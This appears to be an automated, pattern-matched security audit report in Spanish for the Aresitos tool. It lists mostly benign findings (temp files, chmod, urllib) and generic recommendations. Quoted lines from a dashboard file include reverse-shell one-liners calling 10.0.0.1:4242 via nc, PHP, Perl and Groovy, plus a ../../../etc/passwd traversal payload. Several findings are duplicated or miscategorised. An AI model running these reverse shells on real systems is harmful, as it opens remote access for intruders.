# Auditoría de Seguridad - Aresitos

**Fecha**: 2025-08-18 00:00:25

**Archivos analizados**: 64

**Vulnerabilidades encontradas**: 61

## Resumen por Tipo de Vulnerabilidad

### TEMP FILES
**Ocurrencias**: 18

- **controlador/controlador_cuarentena.py:29**
  ```python
  directorio_cuarentena = os.path.join(tempfile.gettempdir(), "aresitos_quarantine")
  ```

- **controlador/controlador_herramientas.py:104**
  ```python
  if arg.startswith('/') and not arg.startswith('/tmp/'):
  ```

- **modelo/modelo_escaneador_avanzado.py:182**
  ```python
  sandbox_dir = tempfile.mkdtemp(prefix='ares_sandbox_')
  ```

- **modelo/modelo_fim.py:288**
  ```python
  return os.path.join(tempfile.gettempdir(), "ares_fim_database.json")
  ```

- **modelo/modelo_fim.py:329**
  ```python
  '/proc/', '/sys/', '/dev/', '/run/', '/tmp/',
  ```

- **modelo/modelo_fim.py:330**
  ```python
  '/var/log/', '/var/cache/', '/var/tmp/',
  ```

- **modelo/modelo_fim.py:335**
  ```python
  '/root/.msf4/logs/', '/tmp/metasploit*/',
  ```

- **modelo/modelo_gestor_diccionarios.py:138**
  ```python
  directorio = os.path.join(tempfile.gettempdir(), "aresitos_diccionarios")
  ```

- **modelo/modelo_gestor_wordlists.py:110**
  ```python
  directorio = os.path.join(tempfile.gettempdir(), "aresitos_wordlists")
  ```

- **modelo/modelo_reportes.py:63**
  ```python
  return tempfile.mkdtemp(prefix="ares_reportes_")
  ```

- **modelo/modelo_siem.py:137**
  ```python
  directorio = os.path.join(tempfile.gettempdir(), "ares_siem_logs")
  ```

- **modelo/modelo_utilidades_sistema.py:119**
  ```python
  temp_dir = tempfile.mkdtemp()
  ```

- **vista/vista_dashboard.py:1176**
  ```python
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
  ```

- **vista/vista_dashboard.py:1176**
  ```python
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
  ```

- **vista/vista_dashboard.py:1176**
  ```python
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
  ```

- **vista/vista_dashboard.py:1176**
  ```python
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
  ```

- **vista/vista_login.py:669**
  ```python
  f"mkdir -p /tmp/aresitos_quarantine && chmod 755 /tmp/aresitos_quarantine",
  ```

- **vista/vista_login.py:669**
  ```python
  f"mkdir -p /tmp/aresitos_quarantine && chmod 755 /tmp/aresitos_quarantine",
  ```

### FILE PERMISSIONS
**Ocurrencias**: 23

- **controlador/controlador_fim.py:1264**
  ```python
  subprocess.run(['chmod', '755', directorio], timeout=5)
  ```

- **controlador/controlador_fim.py:1473**
  ```python
  '-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -k fim_permission_changes',
  ```

- **controlador/controlador_fim.py:1473**
  ```python
  '-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -k fim_permission_changes',
  ```

- **controlador/controlador_fim.py:1473**
  ```python
  '-a always,exit -F arch=b64 -S chmod -S fchmod -S fchmodat -k fim_permission_changes',
  ```

- **controlador/controlador_fim.py:1568**
  ```python
  r'chmod.*(/etc/|/bin/|/sbin/|/usr/bin/)',  # Cambios de permisos
  ```

- **utils/configurar.py:206**
  ```python
  os.chmod(ruta, 0o755)
  ```

- **utils/configurar.py:233**
  ```python
  os.chmod(ruta_launcher, 0o755)
  ```

- **vista/vista_login.py:651**
  ```python
  f"chmod -R 755 {shlex.quote(ruta_proyecto)}",
  ```

- **vista/vista_login.py:655**
  ```python
  f"chmod -R 755 {shlex.quote(os.path.join(ruta_proyecto, 'configuracion'))}",
  ```

- **vista/vista_login.py:656**
  ```python
  f"chmod 644 {shlex.quote(os.path.join(ruta_proyecto, 'configuracion', 'aresitos_config.json'))} 2>/dev/null || true",
  ```

- **vista/vista_login.py:657**
  ```python
  f"chmod 644 {shlex.quote(os.path.join(ruta_proyecto, 'configuracion', 'aresitos_config_kali.json'))} 2>/dev/null || true",
  ```

- **vista/vista_login.py:660**
  ```python
  f"chmod -R 755 {shlex.quote(os.path.join(ruta_proyecto, 'data'))} 2>/dev/null || true",
  ```

- **vista/vista_login.py:661**
  ```python
  f"chmod -R 755 {shlex.quote(os.path.join(ruta_proyecto, 'logs'))} 2>/dev/null || true",
  ```

- **vista/vista_login.py:664**
  ```python
  f"find {shlex.quote(ruta_proyecto)} -name '*.py' -exec chmod +x {{}} \\;",
  ```

- **vista/vista_login.py:665**
  ```python
  f"chmod +x {shlex.quote(os.path.join(ruta_proyecto, 'main.py'))}",
  ```

- **vista/vista_login.py:668**
  ```python
  f"mkdir -p {shlex.quote(os.path.join(ruta_proyecto, 'logs'))} && chmod 755 {shlex.quote(os.path.join(ruta_proyecto, 'logs'))}",
  ```

- **vista/vista_login.py:669**
  ```python
  f"mkdir -p /tmp/aresitos_quarantine && chmod 755 /tmp/aresitos_quarantine",
  ```

- **vista/vista_login.py:672**
  ```python
  "chmod +x /usr/bin/nmap 2>/dev/null || true",
  ```

- **vista/vista_login.py:673**
  ```python
  "chmod +x /usr/bin/masscan 2>/dev/null || true",
  ```

- **vista/vista_login.py:674**
  ```python
  "chmod +x /usr/bin/nikto 2>/dev/null || true",
  ```

- **vista/vista_login.py:675**
  ```python
  "chmod +x /usr/bin/lynis 2>/dev/null || true",
  ```

- **vista/vista_login.py:676**
  ```python
  "chmod +x /usr/bin/rkhunter 2>/dev/null || true",
  ```

- **vista/vista_login.py:677**
  ```python
  "chmod +x /usr/bin/chkrootkit 2>/dev/null || true"
  ```

### NETWORK REQUESTS
**Ocurrencias**: 12

- **modelo/modelo_escaneador_avanzado.py:490**
  ```python
  total_requests = self._cache_resultados['metadatos']['hits'] + self._cache_resultados['metadatos']['misses']
  ```

- **modelo/modelo_escaneador_avanzado.py:491**
  ```python
  hit_rate = (self._cache_resultados['metadatos']['hits'] / total_requests * 100) if total_requests > 0 else 0
  ```

- **modelo/modelo_escaneador_avanzado.py:491**
  ```python
  hit_rate = (self._cache_resultados['metadatos']['hits'] / total_requests * 100) if total_requests > 0 else 0
  ```

- **utils/actualizador_aresitos.py:25**
  ```python
  import urllib.request
  ```

- **utils/actualizador_aresitos.py:26**
  ```python
  import urllib.error
  ```

- **utils/actualizador_aresitos.py:267**
  ```python
  # Descargar con urllib (nativo de Python)
  ```

- **utils/actualizador_aresitos.py:268**
  ```python
  request = urllib.request.Request(url)
  ```

- **utils/actualizador_aresitos.py:271**
  ```python
  with urllib.request.urlopen(request, timeout=30) as response:
  ```

- **utils/actualizador_aresitos.py:291**
  ```python
  except urllib.error.URLError as e:
  ```

- **vista/vista_dashboard.py:662**
  ```python
  import urllib.request
  ```

- **vista/vista_dashboard.py:663**
  ```python
  with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
  ```

- **vista/vista_dashboard.py:1047**
  ```python
  Intercept On/Off                  # Interceptar requests
  ```

### INPUT RAW
**Ocurrencias**: 1

- **utils/actualizador_aresitos.py:124**
  ```python
  respuesta = input("¿Desea continuar con la actualización? (s/n): ").lower().strip()
  ```

### PATH TRAVERSAL
**Ocurrencias**: 4

- **utils/gestor_permisos.py:208**
  ```python
  rutas_sospechosas = ['/etc/passwd', '/etc/shadow', '../', '~/', '/root/']
  ```

- **vista/vista_dashboard.py:1060**
  ```python
  ../../../etc/passwd               # Path traversal
  ```

- **vista/vista_dashboard.py:1060**
  ```python
  ../../../etc/passwd               # Path traversal
  ```

- **vista/vista_dashboard.py:1060**
  ```python
  ../../../etc/passwd               # Path traversal
  ```

### EVAL EXEC
**Ocurrencias**: 3

- **vista/vista_dashboard.py:1182**
  ```python
  php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

- **vista/vista_dashboard.py:1186**
  ```python
  perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```

- **vista/vista_dashboard.py:1193**
  ```python
  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
  ```

## Recomendaciones de Seguridad

1. **Subprocess Shell=True**: Usar shell=False y listas de argumentos
2. **Eval/Exec**: Evitar o validar entrada estrictamente
3. **Input/Raw_input**: Validar y sanitizar entrada del usuario
4. **Hardcoded Secrets**: Usar variables de entorno o archivos de configuración
5. **Command Injection**: Usar subprocess en lugar de os.system
